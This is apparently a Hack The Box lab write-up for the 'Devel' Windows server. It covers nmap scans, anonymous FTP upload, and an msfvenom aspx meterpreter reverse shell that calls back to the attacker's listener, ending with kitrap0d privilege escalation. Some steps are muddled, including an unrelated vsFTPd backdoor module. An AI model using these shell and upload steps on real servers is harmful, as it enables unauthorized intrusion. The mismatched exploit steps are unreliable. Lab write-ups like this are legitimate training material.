# HTB Lab: Devel [10.10.10.5]

In this lab we will again run through our full pen-test process in our attempt to get root access onto the hack the box server called 'Devel'. We will also use this example to get familiar with the msfvenom tool and use metasploit again.  
___

## Lab Contents

1. Scanning the 'Devel' Server.
2. Examining the open ports.
3. Investigating the Anonymous FTP access.
4. Uploading a web shell
5. Creating a custom webshell with msfvenom
6. Setting up our MSF listener
7. Escalating our privileges


___

### 1. Scanning the 'Devel' Server
ON your HTB online account your should see a link for Dedicated labs > eu-dedicated-6 following this link will show you a list of the currently active HTB servers for you to attempt. We will try connect to the 'Devel' server which you should see in your list and should have an IP of 10.10.10.5.

So the first thing we want do is scan what ports are open on the 'devel' server and verify that we have connectivity to the server. 

```bash
$ sudo namp -sP 10.10.10.5
Starting Nmap 7.80 ( https://nmap.org ) at 2019-11-21 02:06 GMT
Nmap scan report for 10.10.10.5
Host is up (0.043s latency).
Nmap done: 1 IP address (1 host up) scanned in 0.08 seconds
```

This command should verify that we have an active connection to the server. (If not go back and troubleshoot the earlier steps listed in the previous HTB labs) Next we want to do a port scan. 

```bash
$ mkdir Devel
$ cd devel
$ sudo nmap -sC -sV 10.10.10.5 -oA devel 
# Nmap 7.80 scan initiated Thu Nov 28 02:16:32 2019 as: nmap -sC -sV -oA devel 10.10.10.5
Nmap scan report for 10.10.10.5
Host is up (0.027s latency).
Not shown: 998 filtered ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 03-18-17  01:06AM       <DIR>          aspnet_client
| 03-17-17  04:37PM                  689 iisstart.htm
|_03-17-17  04:37PM               184946 welcome.png
| ftp-syst: 
|_  SYST: Windows_NT
80/tcp open  http    Microsoft IIS httpd 7.5
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/7.5
|_http-title: IIS7
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Nov 28 02:16:44 2019 -- 1 IP address (1 host up) scanned in 12.23 seconds

```

From the output of the command we can see which ports are open. Normally at this point we'd run our full port scans in the background while we investigate the ports we've already found. Most times our full scans don't give us an extra details or new ports to work with but in this case our full scans have given us some extra details.

### 2. Examining the open ports

Now that we've completed our basic port scan we start to examine each of the different ports that are open. For this box we have the following services open:

```bash
PORT   STATE SERVICE VERSION
21/tcp open  ftp     Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 03-18-17  01:06AM       <DIR>          aspnet_client
| 03-17-17  04:37PM                  689 iisstart.htm
|_03-17-17  04:37PM               184946 welcome.png
| ftp-syst: 
|_  SYST: Windows_NT
80/tcp open  http    Microsoft IIS httpd 7.5
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/7.5
|_http-title: IIS7
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

At this stage of a full penetration test we might run our vulnerability scanner and again leave that run in the background while we check out the open services manually. 

We can see that anonymous FTP is enabled on the ftp sever so that should be our first point of attack. We can also see that the system is running the IIS windows websever, so we also know we're dealing with a windows box.

### 3. Investigating the Anonymous FTP access
Since anonymous ftp access is enabled lets see if we can find anything interesting.

```bash
Connected to 10.10.10.5.
220 Microsoft FTP Service
Name (10.10.10.5:root): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password:
230 User logged in.
Remote system type is Windows_NT.
ftp> ls
200 PORT command successful.
125 Data connection already open; Transfer starting.
03-18-17  01:06AM       <DIR>          aspnet_client
03-17-17  04:37PM                  689 iisstart.htm
03-17-17  04:37PM               184946 welcome.png
226 Transfer complete.

```

lets try download the files and look at them. The names of the file and image suggest that these are the home page for the IIS webserver? Are we in the IIS web directory? and do we have write access to upload a file? lets check it out.

### 4. Uploading a web shell
So it looks like we have the ability to upload files directly to the webserver and access them. This opens up the option of running a web shell. These are powerful little scripts that will basically allow us enter command line commands through the webpage shell. 

When using webshells we need to ensure we use one that is appropriate to the target, so in this case it will need to run the IIS webserver so likely an asp or aspx file. The webserver will then run and render the file for us, executing the script and running our shell. 

Kali linux has a number of webshells installed by default (/usr/share/webshells)that you can try using or find one online that you can use. however, we're going to try use the msfvenom tool to generate a shell for us. Msfvenom allows us to generate a powerful metasploit shell (meterpreter) on the target system.

### 5. Creating a custom webshell with msfvenom

```bash
$ msfvenom -h
```
We can use msfvenom to create a custom webshell, we just need to pick our payload and specify the format. So for us that means -f aspx to generate an aspx file and we're going to use one of the safest reverse shells for windows i.e. windows/meterpreter/reverse_tcp and also use -o to give the output file a name, so in my case mark.aspx.

Because this is a reverse meterpreter session we'll also need to create a listen on our own machine to catch the connection when it tries to connect back to us. So we should tell this webshell what port and IP to use to connect back to us. So we can do this by setting our LHOST and LPORt values.

```bash
$ msfvenom -p windows/meterpreter/reverse_tcp -f aspx -o myshell.aspx LHOST=10.10.14.2 LPORT=1234
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 341 bytes
Final size of aspx file: 2815 bytes
Saved as: myshell.aspx

```

Once we've created the custom webshell we'll need to upload it to the ftp directory so we can access it and get the webserver to execute it for us, in order for the script to take effect. However before we do get the server to run it we need to set up our own end to listen for the incoming connection when the script tries to call home.

### 6. Setting up our MSF listener

Searchsploit indicated that there is a known exploit for this exact version of vsFTPd. So we will try to use metasploit to launch the exploit and get access to the server. So were going to start msf console and step through the full process.

```bash
$ msfconsole
$ use exploit/multi/handler
$ set payload windows/meterpreter/reverse_tcp
$ show options
$ set LHOST tun0
$ set LPORT 1234
$ run
[*] Started reverse TCP handler on 10.10.14.2:1234 

```

Once we have our handler up and running we just need to get the IIS webserver to execute our script code. We can do this by simply going to the file we uploaded in the browser, and because its an aspx file the server attemots to execute it. Once done we should see the connection on our handler.
```bash
[*] Sending stage (179779 bytes) to 10.10.10.5
[*] Meterpreter session 1 opened (10.10.14.2:1234 -> 10.10.10.5:49160) at 2019-11-28 03:07:51 +0000


```

Next we need to tell msf that we want to use this exploit.

```bash
msf5 > use exploit/unix/ftp/vsftpd_234_backdoor
msf5 exploit(unix/ftp/vsftpd_234_backdoor) > 
meterpreter > l
```

Playing around with our meterpreter shell shows it lots we can do, but at the moment we don't have enough permissions to do anything fun or get the text files we need to need to claim the box.

So lets see if there is any way we can raise our privileges.

#### 7. Escalating our privileges
To escalate our privileges we can again use metasploit to help us. So we want to use metasploit to suggest escalation option for us. So lets background our handler (Ctrl-Z) and search suggest to get the exploit we want to use.

```bash
Background session 1? [y/N]  
msf5 exploit(multi/handler) > search suggest

Matching Modules
================

   #  Name                                             Disclosure Date  Rank    Check  Description
   -  ----                                             ---------------  ----    -----  -----------
   0  auxiliary/server/icmp_exfil                                       normal  No     ICMP Exfiltration Service
   1  exploit/windows/browser/ms10_018_ie_behaviors    2010-03-09       good    No     MS10-018 Microsoft Internet Explorer DHTML Behaviors Use After Free
   2  exploit/windows/smb/timbuktu_plughntcommand_bof  2009-06-25       great   No     Timbuktu PlughNTCommand Named Pipe Buffer Overflow
   3  post/multi/recon/local_exploit_suggester                          normal  No     Multi Recon Local Exploit Suggester
   4  post/osx/gather/enum_colloquy                                     normal  No     OS X Gather Colloquy Enumeration
   5  post/osx/manage/sonic_pi                                          normal  No     OS X Manage Sonic Pi

```
So from the list shown we're going to want to use the exploit_suggester so option 3. we'll want to show options and set the session to match ours which is likely 1 and then run the suggester tool.

Once you've run that you should get back a number of possible options. We can work our way through the list until we find an options that works.

You'll quickly find the windows/local/ms10_015_kitrap0d exploit which you should be able to run to get onto the boxes with full privileges and get the hashes need to claim the box.
